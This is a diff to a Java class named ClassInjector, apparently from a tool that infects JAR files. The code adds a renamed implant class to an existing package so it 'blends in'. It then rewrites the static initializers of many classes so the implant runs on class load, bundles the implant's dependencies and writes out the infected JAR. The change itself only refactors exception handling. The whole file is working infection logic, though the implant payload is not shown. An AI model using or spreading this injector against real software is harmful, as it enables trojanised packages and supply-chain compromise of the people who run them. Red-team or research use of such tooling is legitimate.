@@ -11,7 +11,6 @@ import java.util.Optional;
 import java.util.Set;
 import java.util.jar.JarEntry;
 import java.util.logging.Logger;
-import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
 
@@ -33,99 +32,95 @@ public class ClassInjector implements Injector {
         }
 
         BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
-        try {
-            int countClinitModified = 0;
-            for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
-                if (!entry.getName().endsWith(".class")) {
-                    continue;
-                }
-                if (entry.getName().endsWith("/" + IMPLANT_CLASS_NAME + ".class") || entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
-                    log.fine("Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
-                    continue;
-                }
+        int countClinitModified = 0;
+        for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
+            if (!entry.getName().endsWith(".class")) {
+                continue;
+            }
+            if (entry.getName().endsWith("/" + IMPLANT_CLASS_NAME + ".class") || entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
+                log.fine("Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
+                continue;
+            }
 
-                ClassFile currentlyProcessing = readClassFile(entry.getContent());
-                ClassName currentlyProcessingName = ClassName.of(currentlyProcessing);
+            ClassFile currentlyProcessing = readClassFile(entry.getContent());
+            ClassName currentlyProcessingName = ClassName.of(currentlyProcessing);
 
-                String targetPackageName = currentlyProcessingName.getPackageName();
-                if (implantedClass == null) {
-                    /*
-                     * Since there are other classes in this directory, the implant will blend in better here.
-                     * Any directory will do and only one occurrence of the implant class in the JAR is enough.
-                     */
-                    ClassFile implant = implantHandler.loadFreshConfiguredSpecimen();
-                    ClassFile renamedImplant = deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
-                    ClassName renamedImplantName = ClassName.of(renamedImplant);
-                    JarEntry newJarEntry = new JarEntry(renamedImplantName.getClassFilePath());
-                    try {
-                        fiddler.addNewEntry(newJarEntry, asByteArray(renamedImplant));
-                        log.info("Created implant class '" + newJarEntry.getName() + "'.");
-                    } catch (ZipException e) {
-                        log.warning("Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
-                        continue;   // TODO Signal these different endgames using exceptions instead
-                    }
-
-                    implantedClass = renamedImplant;
-                }
-
+            String targetPackageName = currentlyProcessingName.getPackageName();
+            if (implantedClass == null) {
                 /*
-                 * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
-                 * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
-                 * explicitly use the implant class. The implant will thus be called upon once per class that is
-                 * infected. Remember that a class initializer will run only once per class.
-                 * Several classes are infected because it's difficult to know what specific class will be used
-                 * by an app.
+                 * Since there are other classes in this directory, the implant will blend in better here.
+                 * Any directory will do and only one occurrence of the implant class in the JAR is enough.
                  */
-                Optional<ClassFile> modifiedClass = modifyClinit(currentlyProcessing, implantedClass);
-                if (modifiedClass.isEmpty()) {
-                    // This class is too weird at the moment. Move on to the next one.
-                    continue;
+                ClassFile implant = implantHandler.loadFreshConfiguredSpecimen();
+                ClassFile renamedImplant = deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
+                ClassName renamedImplantName = ClassName.of(renamedImplant);
+                JarEntry newJarEntry = new JarEntry(renamedImplantName.getClassFilePath());
+                try {
+                    fiddler.addNewEntry(newJarEntry, asByteArray(renamedImplant));
+                    log.info("Created implant class '" + newJarEntry.getName() + "'.");
+                } catch (DuplicateEntryException e) {
+                    log.warning("Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
+                    break;
                 }
-                entry.replaceContentWith(asByteArray(modifiedClass.get()));
-                countClinitModified++;
-                log.fine("Modified class initializer for '" + entry.getName() + "'.");
-            }
-            if (countClinitModified > 0) {
-                log.info("Modified the class initializer for " + countClinitModified + " classes.");
-            } else {
-                log.warning("No classes with suitable class initializers were found.");
+
+                implantedClass = renamedImplant;
             }
 
-            boolean didInfect = implantedClass != null && countClinitModified > 0;
-
-            // Add any dependency classes needed for the implant
-            if (didInfect) {
-                int countDependencies = 0;
-                for (Map.Entry<ClassName, byte[]> dependencyEntry : implantHandler.getDependencies().entrySet()) {
-                    String fileName = dependencyEntry.getKey().getClassFilePath();
-                    byte[] fileContent = dependencyEntry.getValue();
-
-                    JarEntry newJarEntry = new JarEntry(fileName);
-                    try {
-                        fiddler.addNewEntry(newJarEntry, fileContent);
-                        countDependencies++;
-                        log.fine("Added dependency file '" + fileName + "'.");
-                    } catch (ZipException e) {
-                        // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
-                        log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
-                        didInfect = false;
-                        break;
-                    }
-                }
-                log.info("Added " + countDependencies + " dependencies.");
+            /*
+             * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
+             * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
+             * explicitly use the implant class. The implant will thus be called upon once per class that is
+             * infected. Remember that a class initializer will run only once per class.
+             * Several classes are infected because it's difficult to know what specific class will be used
+             * by an app.
+             */
+            Optional<ClassFile> modifiedClass = modifyClinit(currentlyProcessing, implantedClass);
+            if (modifiedClass.isEmpty()) {
+                // This class is too weird at the moment. Move on to the next one.
+                continue;
             }
-
-            if (didInfect) {
-                fiddler.write(outputJar);
-                log.info("Injection successful. Wrote output JAR to '" + outputJar + "'.");
-            } else {
-                log.warning("Injection failed. No output JAR was written.");
-            }
-
-            return didInfect;
-        } catch (Exception e) {
-            throw new IOException("Something went wrong", e);
+            entry.replaceContentWith(asByteArray(modifiedClass.get()));
+            countClinitModified++;
+            log.fine("Modified class initializer for '" + entry.getName() + "'.");
         }
+        if (countClinitModified > 0) {
+            log.info("Modified the class initializer for " + countClinitModified + " classes.");
+        } else {
+            log.warning("No classes with suitable class initializers were found.");
+        }
+
+        boolean didInfect = implantedClass != null && countClinitModified > 0;
+
+        // Add any dependency classes needed for the implant
+        if (didInfect) {
+            int countDependencies = 0;
+            for (Map.Entry<ClassName, byte[]> dependencyEntry : implantHandler.getDependencies().entrySet()) {
+                String fileName = dependencyEntry.getKey().getClassFilePath();
+                byte[] fileContent = dependencyEntry.getValue();
+
+                JarEntry newJarEntry = new JarEntry(fileName);
+                try {
+                    fiddler.addNewEntry(newJarEntry, fileContent);
+                    countDependencies++;
+                    log.fine("Added dependency file '" + fileName + "'.");
+                } catch (DuplicateEntryException e) {
+                    // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
+                    log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
+                    didInfect = false;
+                    break;
+                }
+            }
+            log.info("Added " + countDependencies + " dependencies.");
+        }
+
+        if (didInfect) {
+            fiddler.write(outputJar);
+            log.info("Injection successful. Wrote output JAR to '" + outputJar + "'.");
+        } else {
+            log.warning("Injection failed. No output JAR was written.");
+        }
+
+        return didInfect;
     }
 
     /**
